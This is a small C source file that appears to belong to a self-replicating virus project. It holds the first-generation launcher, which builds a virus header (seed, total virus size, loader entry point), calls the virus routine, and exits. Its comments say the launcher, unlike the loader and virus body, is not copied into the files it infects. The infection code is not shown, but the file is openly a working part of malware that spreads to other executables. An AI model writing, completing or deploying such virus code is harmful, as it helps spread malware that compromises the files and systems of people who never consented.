
#include "syscall.h"
#include "virus.h"
#include "loader.h"

/*
** _start is the launcher function of the virus
**   - it is launched instead of the loader for the first run
**   - it is NOT copied into infected files (unlike the loader and virus)
*/

void	_start(void)
{
	/* 1st generation values */
	struct virus_header	vhdr = {
		.seed            = 0xfadedbade1f5eed5,
		.full_virus_size = _start - loader_entry,
		.loader_entry    = loader_entry,
	};

	virus(&vhdr);

	sys_exit(0);
	__builtin_unreachable();
}
